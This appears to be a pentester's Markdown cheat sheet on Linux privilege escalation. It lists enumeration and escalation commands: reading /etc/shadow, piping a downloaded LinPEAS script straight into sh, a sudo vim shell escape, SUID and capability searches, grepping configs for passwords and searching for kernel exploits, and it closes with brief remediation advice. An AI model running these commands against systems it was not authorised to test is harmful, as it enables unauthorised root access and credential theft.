---
tags: [vulnerability, linux, privesc, post-exploitation]
vuln_name: "Linux Privilege Escalation"
owasp_category: "A05:2021 - Security Misconfiguration"
last_updated: 2024-01-01
---

# 🐛 Linux Privilege Escalation

## 📖 Description

> Techniques to move from standard user access to root on a Linux system.

---

## 🔍 Enumeration (always start here)

```bash
# System info
uname -a
cat /etc/os-release
id && whoami

# Users
cat /etc/passwd
cat /etc/shadow  (if readable)

# Automated — LinPEAS (most comprehensive)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Automated — LinEnum
./LinEnum.sh
```

---

## 💥 Common Vectors

### 1. Sudo misconfiguration

```bash
sudo -l   # List sudo rights

# If we can run vim as sudo
sudo vim -c ':!/bin/bash'

# GTFOBins — list of exploitable binaries
# https://gtfobins.github.io/
```

### 2. SUID / SGID binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### 3. Cron jobs

```bash
cat /etc/crontab
ls -la /etc/cron*
# Look for writable scripts executed by root
```

### 4. Capabilities

```bash
getcap -r / 2>/dev/null
# python3 with cap_setuid → root possible
```

### 5. Passwords in files

```bash
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password"
grep -r "password" /var/www/ 2>/dev/null
history
```

### 6. Kernel exploits

```bash
uname -r   # Kernel version
# Search for matching CVEs on exploit-db
searchsploit linux kernel 5.4
```

---

## 🛡️ Remediation

- Regularly audit sudo rights (`/etc/sudoers`)
- Remove SUID bit from unnecessary binaries
- Secure cron scripts (owner root, permissions 700)
- Regular kernel updates

---

## 🔗 Resources

- [GTFOBins](https://gtfobins.github.io/) ← essential
- [PayloadsAllTheThings — PrivEsc Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks — Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
